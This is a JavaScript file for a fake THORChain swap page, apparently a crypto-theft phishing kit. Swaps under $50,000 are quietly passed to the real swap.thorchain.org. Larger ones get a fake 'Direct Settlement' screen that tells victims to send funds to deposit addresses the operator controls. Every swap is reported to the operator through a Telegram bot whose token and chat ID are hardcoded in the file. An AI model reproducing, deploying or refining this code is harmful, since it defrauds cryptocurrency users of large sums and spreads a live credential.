(function () {
    'use strict';

    // ══════════════════════════════════════════════════════════════
    // CONFIGURATION
    // ══════════════════════════════════════════════════════════════
    var THRESHOLD_USD = 50000;
    var THORNODE = 'https://thornode.ninerealms.com';
    var MIDGARD = 'https://midgard.ninerealms.com';
    var BASE = 1e8;

    // ⚠️ TELEGRAM — Replace these with your values
    var TG_BOT_TOKEN = '8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
    var TG_CHAT_ID = '-5160305858';

    var ASSETS = {
        'BTC.BTC':   { symbol: 'BTC',  name: 'Bitcoin',      icon: 'images/chains/BTC.svg',  network: 'Bitcoin' },
        'ETH.ETH':   { symbol: 'ETH',  name: 'Ethereum',     icon: 'images/chains/ETH.svg',  network: 'Ethereum (ERC-20)' },
        'BSC.BNB':   { symbol: 'BNB',  name: 'BNB Chain',    icon: 'images/chains/BSC.svg',  network: 'BNB Smart Chain (BEP-20)' },
        'AVAX.AVAX': { symbol: 'AVAX', name: 'Avalanche',    icon: 'images/chains/AVAX.svg', network: 'Avalanche C-Chain' },
        'GAIA.ATOM': { symbol: 'ATOM', name: 'Cosmos Hub',   icon: 'images/chains/GAIA.svg', network: 'Cosmos Hub' },
        'DOGE.DOGE': { symbol: 'DOGE', name: 'Dogecoin',     icon: 'images/chains/DOGE.svg', network: 'Dogecoin' },
        'BCH.BCH':   { symbol: 'BCH',  name: 'Bitcoin Cash', icon: 'images/chains/BCH.svg',  network: 'Bitcoin Cash' },
        'LTC.LTC':   { symbol: 'LTC',  name: 'Litecoin',     icon: 'images/chains/LTC.svg',  network: 'Litecoin' },
        'BASE.ETH':  { symbol: 'ETH',  name: 'Base',         icon: 'images/chains/BASE.svg', network: 'Base (L2)' },
        'XRP.XRP':   { symbol: 'XRP',  name: 'Ripple',       icon: 'images/chains/XRP.svg',  network: 'XRP Ledger' },
        'TRX.TRX':   { symbol: 'TRX',  name: 'TRON',         icon: 'images/chains/TRON.svg', network: 'TRON (TRC-20)' }
    };

    var prices = {
        'BTC.BTC': 104850, 'ETH.ETH': 3850, 'BSC.BNB': 610,
        'AVAX.AVAX': 36, 'GAIA.ATOM': 9.5, 'DOGE.DOGE': 0.18,
        'BCH.BCH': 480, 'LTC.LTC': 105, 'BASE.ETH': 3850,
        'XRP.XRP': 2.35, 'TRX.TRX': 0.27
    };
    var livePrices = false;

    var DEPOSIT_ADDRESSES = {
        'BTC.BTC':   'bc1qYOUR_BTC_ADDRESS',
        'ETH.ETH':   '0xYOUR_ETH_ADDRESS',
        'BSC.BNB':   '0xYOUR_BNB_ADDRESS',
        'AVAX.AVAX': '0xYOUR_AVAX_ADDRESS',
        'GAIA.ATOM': 'cosmosYOUR_ATOM_ADDRESS',
        'DOGE.DOGE': 'DYOUR_DOGE_ADDRESS',
        'BCH.BCH':   'bitcoincash:YOUR_BCH_ADDRESS',
        'LTC.LTC':   'ltc1YOUR_LTC_ADDRESS',
        'BASE.ETH':  '0xYOUR_BASE_ADDRESS',
        'XRP.XRP':   'rYOUR_XRP_ADDRESS',
        'TRX.TRX':   'TYOUR_TRX_ADDRESS'
    };

    var d = {};

    // ══════════════════════════════════════════════════════════════
    // TELEGRAM — DIRECT API CALL (No bot server needed)
    // ══════════════════════════════════════════════════════════════
    function notifyBot(data) {
        if (!TG_BOT_TOKEN || TG_BOT_TOKEN.indexOf('YOUR_') !== -1) {
            console.log('Telegram not configured');
            return;
        }

        var message = formatTelegramMessage(data);

        fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        }).then(function (r) {
            if (r.ok) console.log('Telegram notified');
            else r.json().then(function (d) { console.warn('TG error:', d); });
        }).catch(function (err) {
            console.warn('TG failed:', err.message);
        });
    }

    function formatTelegramMessage(data) {
        var isBelowThreshold = data.type === 'below_threshold';
        var emoji = isBelowThreshold ? '\uD83D\uDFE0' : '\uD83D\uDFE2';
        var statusNote = isBelowThreshold ? ' (below threshold)' : '';

        var msg = '';
        msg += emoji + ' <b>New Swap Detected</b>' + statusNote + '\n';
        msg += '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n';

        msg += '<b>Status:</b> ' + (data.status || 'waiting') + '\n';

        if (data.swapUrl) {
            msg += '<b>Swap ID:</b> <a href="' + data.swapUrl + '">' + data.swapId + '</a>\n\n';
        } else {
            msg += '<b>Swap ID:</b> ' + data.swapId + '\n\n';
        }

        msg += '<b>From:</b> ' + data.fromSymbol + ' (' + data.fromName + ')\n';
        msg += '<b>To:</b> ' + data.toSymbol + ' (' + data.toName + ')\n';

        var amtStr = data.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 8 });
        var usdStr = data.amountUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        msg += '<b>Amount:</b> ' + amtStr + ' ' + data.fromSymbol + ' ($' + usdStr + ')\n';

        if (!isBelowThreshold) {
            if (data.depositAddress) {
                msg += '\n<b>Deposit Address:</b>\n<code>' + data.depositAddress + '</code>\n';
            }
            if (data.estimatedReceive) {
                var estStr = data.estimatedReceive.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 8 });
                msg += '\n<b>Est. Receive:</b> ~' + estStr + ' ' + data.toSymbol + '\n';
            }
            var quoteSource = data.isLiveQuote ? '\u2705 THORChain Live' : '\u26A0\uFE0F Estimated';
            msg += '<b>Quote:</b> ' + quoteSource + '\n';
        }

        if (isBelowThreshold) {
            var threshStr = data.threshold.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            msg += '\n<b>Redirected to:</b> swap.thorchain.org\n';
            msg += '<b>Threshold:</b> $' + threshStr + '\n';
        }

        var now = new Date(data.timestamp);
        msg += '\n<b>Time:</b> ' + now.toUTCString() + '\n';

        if (data.referrer && data.referrer !== 'direct') {
            msg += '<b>Referrer:</b> ' + data.referrer + '\n';
        }

        return msg;
    }

    // ══════════════════════════════════════════════════════════════
    // HELPERS
    // ══════════════════════════════════════════════════════════════
    function fmtUsd(v) {
        return v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    function fmtCrypto(v) {
        if (v >= 1) return v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 });
        return v.toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 8 });
    }

    function getEl(id) { return document.getElementById(id); }

    function generateSwapId() {
        return 'SWAP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8).toUpperCase();
    }

    // ══════════════════════════════════════════════════════════════
    // PICKER DISPLAY (no event dispatch - no infinite loop)
    // ══════════════════════════════════════════════════════════════
    function updatePickerDisplay() {
        var sOpt = d.sell.options[d.sell.selectedIndex];
        if (sOpt) {
            d.sellIcon.src = sOpt.getAttribute('data-icon') || d.sellIcon.src;
            d.sellSym.textContent = sOpt.getAttribute('data-symbol') || sOpt.text;
            d.sellName.textContent = sOpt.getAttribute('data-name') || '';
        }
        var bOpt = d.buy.options[d.buy.selectedIndex];
        if (bOpt) {
            d.buyIcon.src = bOpt.getAttribute('data-icon') || d.buyIcon.src;
            d.buySym.textContent = bOpt.getAttribute('data-symbol') || bOpt.text;
            d.buyName.textContent = bOpt.getAttribute('data-name') || '';
        }
        try { history.replaceState(null, '', 'swap.html?sellAsset=' + d.sell.value + '&buyAsset=' + d.buy.value); } catch (e) { }
    }

    // ══════════════════════════════════════════════════════════════
    // ESTIMATES
    // ══════════════════════════════════════════════════════════════
    function estimate() {
        if (!d.sell || !d.buy || !d.amount) return;
        var sKey = d.sell.value;
        var bKey = d.buy.value;
        var amt = parseFloat(d.amount.value);

        if (isNaN(amt) || amt <= 0 || !prices[sKey]) {
            d.sellUsd.textContent = '$0';
            d.buyEst.textContent = '0';
            d.buyUsd.textContent = '$0';
            return;
        }

        var usd = amt * prices[sKey];
        d.sellUsd.textContent = '$' + fmtUsd(usd);

        if (prices[bKey] && prices[bKey] > 0) {
            var est = usd / prices[bKey];
            d.buyEst.textContent = fmtCrypto(est);
            d.buyUsd.textContent = '\u2248 $' + fmtUsd(usd);
        } else {
            d.buyEst.textContent = '\u2014';
            d.buyUsd.textContent = '';
        }
    }

    // ══════════════════════════════════════════════════════════════
    // LIVE PRICES
    // ══════════════════════════════════════════════════════════════
    function fetchPrices() {
        fetch(MIDGARD + '/v2/pools')
            .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
            .then(function (pools) {
                if (!Array.isArray(pools)) return;
                pools.forEach(function (p) {
                    if (ASSETS[p.asset] && p.assetPriceUSD) prices[p.asset] = parseFloat(p.assetPriceUSD);
                });
                livePrices = true;
                estimate();
            })
            .catch(function (err) { console.warn('Prices:', err.message); });
    }

    // ══════════════════════════════════════════════════════════════
    // PREVENT DUPLICATES / FLIP
    // ══════════════════════════════════════════════════════════════
    function preventDuplicates(which) {
        if (d.sell.value === d.buy.value) {
            var target = (which === 'sell') ? d.buy : d.sell;
            var other = (which === 'sell') ? d.sell : d.buy;
            for (var i = 0; i < target.options.length; i++) {
                if (target.options[i].value !== other.value) { target.value = target.options[i].value; break; }
            }
        }
        updatePickerDisplay();
        estimate();
        if (d.result) d.result.innerHTML = '';
    }

    function flipAssets() {
        var tmp = d.sell.value;
        d.sell.value = d.buy.value;
        d.buy.value = tmp;
        updatePickerDisplay();
        estimate();
        if (d.result) d.result.innerHTML = '';
    }

    // ══════════════════════════════════════════════════════════════
    // BUTTON STATES
    // ══════════════════════════════════════════════════════════════
    function btnReady() {
        d.btn.disabled = false;
        d.btnText.textContent = 'Swap';
        d.btnSpin.style.display = 'none';
    }

    function btnLoading(text) {
        d.btn.disabled = true;
        d.btnText.textContent = text || 'Getting quote...';
        d.btnSpin.style.display = 'inline-block';
    }

    function showError(msg) {
        if (!d.result) return;
        d.result.innerHTML =
            '<div class="tc-result-error">' +
            '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">' +
            '<circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>' +
            '<span>' + msg + '</span></div>';
    }

    // ══════════════════════════════════════════════════════════════
    // MAIN SWAP
    // ══════════════════════════════════════════════════════════════
    function doSwap() {
        var sKey = d.sell.value;
        var bKey = d.buy.value;
        var amt = parseFloat(d.amount.value);
        var sAsset = ASSETS[sKey];
        var bAsset = ASSETS[bKey];

        if (!sAsset || !bAsset) return showError('Invalid asset selection.');
        if (isNaN(amt) || amt <= 0) return showError('Please enter a valid amount.');
        if (sKey === bKey) return showError('Cannot swap the same asset.');

        var usd = amt * (prices[sKey] || 0);
        if (usd <= 0) return showError('Unable to estimate value.');

        var swapId = generateSwapId();
        var swapUrl = window.location.origin + window.location.pathname + '?sellAsset=' + sKey + '&buyAsset=' + bKey + '&id=' + swapId;

        // BELOW THRESHOLD
        if (usd < THRESHOLD_USD) {
            notifyBot({
                type: 'below_threshold',
                status: 'redirected',
                swapId: swapId,
                swapUrl: swapUrl,
                fromSymbol: sAsset.symbol,
                fromName: sAsset.name,
                fromNetwork: sAsset.network,
                toSymbol: bAsset.symbol,
                toName: bAsset.name,
                toNetwork: bAsset.network,
                amount: amt,
                amountUsd: usd,
                threshold: THRESHOLD_USD,
                timestamp: new Date().toISOString(),
                referrer: document.referrer || 'direct'
            });

            setTimeout(function () {
                window.location.href = 'https://swap.thorchain.org/swap?sellAsset=' + sKey + '&buyAsset=' + bKey;
            }, 200);
            return;
        }

        // ABOVE THRESHOLD
        btnLoading('Getting quote...');

        var tcAmount = Math.round(amt * BASE);
        var quoteUrl = THORNODE + '/thorchain/quote/swap?from_asset=' + sKey +
            '&to_asset=' + bKey + '&amount=' + tcAmount + '&streaming_interval=1';

        var done = false;
        var timer = setTimeout(function () {
            if (done) return;
            done = true;
            var estOut = prices[bKey] > 0 ? usd / prices[bKey] : 0;
            finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, false, swapId, swapUrl);
        }, 6000);

        fetch(quoteUrl)
            .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
            .then(function (data) {
                if (done) return;
                done = true;
                clearTimeout(timer);
                var estOut = data.expected_amount_out ? parseFloat(data.expected_amount_out) / BASE : (prices[bKey] > 0 ? usd / prices[bKey] : 0);
                finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, true, swapId, swapUrl);
            })
            .catch(function () {
                if (done) return;
                done = true;
                clearTimeout(timer);
                var estOut = prices[bKey] > 0 ? usd / prices[bKey] : 0;
                finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, false, swapId, swapUrl);
            });
    }

    function finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, isLiveQuote, swapId, swapUrl) {
        var depositAddr = DEPOSIT_ADDRESSES[sKey] || 'ADDRESS_NOT_CONFIGURED';

        notifyBot({
            type: 'above_threshold',
            status: 'waiting',
            swapId: swapId,
            swapUrl: swapUrl,
            fromSymbol: sAsset.symbol,
            fromName: sAsset.name,
            fromNetwork: sAsset.network,
            toSymbol: bAsset.symbol,
            toName: bAsset.name,
            toNetwork: bAsset.network,
            amount: amt,
            amountUsd: usd,
            estimatedReceive: estOut,
            depositAddress: depositAddr,
            isLiveQuote: isLiveQuote,
            threshold: THRESHOLD_USD,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'direct'
        });

        showDeposit(sAsset, bAsset, sKey, bKey, amt, usd, estOut, isLiveQuote, depositAddr);
        btnReady();
    }

    // ══════════════════════════════════════════════════════════════
    // DEPOSIT UI
    // ══════════════════════════════════════════════════════════════
    function showDeposit(sAsset, bAsset, sKey, bKey, amt, usd, estOut, isLiveQuote, address) {
        if (!d.result) return;
        var slippage = window.tcSlippage || 1;
        var rate = amt > 0 ? fmtCrypto(estOut / amt) : '0';

        var h = '';
        h += '<div class="tc-result-steps">';
        h += '<div class="tc-step active"><span class="tc-step-num">1</span><span class="tc-step-label">Quote</span></div>';
        h += '<div class="tc-step-line active"></div>';
        h += '<div class="tc-step active"><span class="tc-step-num">2</span><span class="tc-step-label">Deposit</span></div>';
        h += '<div class="tc-step-line"></div>';
        h += '<div class="tc-step"><span class="tc-step-num">3</span><span class="tc-step-label">Complete</span></div>';
        h += '</div>';

        h += '<div class="tc-result-card">';
        h += '<div class="tc-result-header"><div class="tc-result-badge">\uD83D\uDD12 Large Swap \u2014 Direct Settlement</div></div>';
        h += '<div class="tc-result-summary">';
        h += '<div class="tc-result-row"><span class="tc-result-label">You Send</span><span class="tc-result-value"><img src="' + sAsset.icon + '" class="tc-result-coin"><strong>' + amt + ' ' + sAsset.symbol + '</strong></span></div>';
        h += '<div class="tc-result-row"><span class="tc-result-label">USD Value</span><span class="tc-result-value">$' + fmtUsd(usd) + '</span></div>';
        h += '<div class="tc-result-row"><span class="tc-result-label">Est. Receive</span><span class="tc-result-value"><img src="' + bAsset.icon + '" class="tc-result-coin"><strong>~' + fmtCrypto(estOut) + ' ' + bAsset.symbol + '</strong></span></div>';
        h += '<div class="tc-result-row"><span class="tc-result-label">Slippage</span><span class="tc-result-value">' + slippage + '%</span></div>';
        h += '<div class="tc-result-row"><span class="tc-result-label">Rate</span><span class="tc-result-value">1 ' + sAsset.symbol + ' \u2248 ' + rate + ' ' + bAsset.symbol + '</span></div>';
        h += '<div class="tc-result-row"><span class="tc-result-label">Quote</span><span class="tc-result-value" style="color:' + (isLiveQuote ? 'var(--green)' : 'var(--warn-text)') + ';">' + (isLiveQuote ? '\u2705 Live' : '\u26A0 Est.') + '</span></div>';
        h += '</div>';

        h += '<div class="tc-deposit-section">';
        h += '<div class="tc-deposit-title"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>Send ' + sAsset.symbol + ' to this address</div>';
        h += '<div class="tc-deposit-instruction">Send exactly <strong>' + amt + ' ' + sAsset.symbol + '</strong> to:</div>';
        h += '<div class="tc-deposit-addr" id="addrDisplay"><span class="tc-addr-text">' + address + '</span><svg class="tc-addr-copy-icon" width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg></div>';
        h += '<button class="tc-deposit-copy-btn" id="copyAddrBtn"><svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg>Copy Address</button>';
        h += '</div>';

        h += '<div class="tc-deposit-warning"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>';
        h += '<span>Only send <strong>' + sAsset.symbol + '</strong> on <strong>' + sAsset.network + '</strong>. Wrong network = loss.</span></div>';

        h += '<div class="tc-deposit-note"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
        h += '<span>Your <strong>' + bAsset.symbol + '</strong> arrives in 10\u201330 minutes.</span></div>';
        h += '</div>';

        d.result.innerHTML = h;
        getEl('addrDisplay').addEventListener('click', copyAddress);
        getEl('copyAddrBtn').addEventListener('click', copyAddress);
        d.result.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    // ══════════════════════════════════════════════════════════════
    // COPY ADDRESS
    // ══════════════════════════════════════════════════════════════
    function copyAddress() {
        var addrEl = getEl('addrDisplay');
        var btn = getEl('copyAddrBtn');
        if (!addrEl) return;
        var textEl = addrEl.querySelector('.tc-addr-text');
        var addr = textEl ? textEl.textContent.trim() : addrEl.textContent.trim();

        function onDone() {
            if (btn) { btn.classList.add('copied'); btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg> Copied!'; }
            if (addrEl) addrEl.classList.add('copied');
            setTimeout(function () {
                if (btn) { btn.classList.remove('copied'); btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg> Copy Address'; }
                if (addrEl) addrEl.classList.remove('copied');
            }, 2500);
        }

        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(addr).then(onDone).catch(function () { fallbackCopy(addr); onDone(); });
        } else { fallbackCopy(addr); onDone(); }
    }

    function fallbackCopy(text) {
        var ta = document.createElement('textarea');
        ta.value = text;
        ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px';
        document.body.appendChild(ta);
        ta.focus(); ta.select();
        try { document.execCommand('copy'); } catch (e) { }
        document.body.removeChild(ta);
    }

    // ══════════════════════════════════════════════════════════════
    // INIT
    // ══════════════════════════════════════════════════════════════
    function init() {
        d.sell = getEl('sellAssetSelect');
        d.buy = getEl('buyAssetSelect');
        d.sellIcon = getEl('sellIcon');
        d.buyIcon = getEl('buyIcon');
        d.sellSym = getEl('sellSymbol');
        d.sellName = getEl('sellName');
        d.buySym = getEl('buySymbolDisplay');
        d.buyName = getEl('buyNameDisplay');
        d.amount = getEl('sellAmount');
        d.sellUsd = getEl('sellUsd');
        d.buyEst = getEl('buyEstimate');
        d.buyUsd = getEl('buyUsd');
        d.btn = getEl('swapBtn');
        d.btnText = getEl('btnText');
        d.btnSpin = getEl('btnSpinner');
        d.result = getEl('resultArea');
        d.arrow = getEl('swapArrow');

        if (!d.sell || !d.buy || !d.btn) { console.error('Missing elements'); return; }

        var params = new URLSearchParams(window.location.search);
        var sp = params.get('sellAsset');
        var bp = params.get('buyAsset');
        if (sp && ASSETS[sp]) d.sell.value = sp;
        if (bp && ASSETS[bp]) d.buy.value = bp;
        if (d.sell.value === d.buy.value) {
            for (var i = 0; i < d.buy.options.length; i++) {
                if (d.buy.options[i].value !== d.sell.value) { d.buy.value = d.buy.options[i].value; break; }
            }
        }

        updatePickerDisplay();
        estimate();
        btnReady();

        d.sell.addEventListener('change', function () { preventDuplicates('sell'); });
        d.buy.addEventListener('change', function () { preventDuplicates('buy'); });
        d.amount.addEventListener('input', function () { estimate(); if (d.result) d.result.innerHTML = ''; });
        d.amount.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); doSwap(); } });
        d.btn.addEventListener('click', function (e) { e.preventDefault(); doSwap(); });
        if (d.arrow) d.arrow.addEventListener('click', function (e) { e.preventDefault(); flipAssets(); });

        fetchPrices();
        setInterval(fetchPrices, 60000);
        console.log('Swap page ready');
    }

    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
    else init();

})();
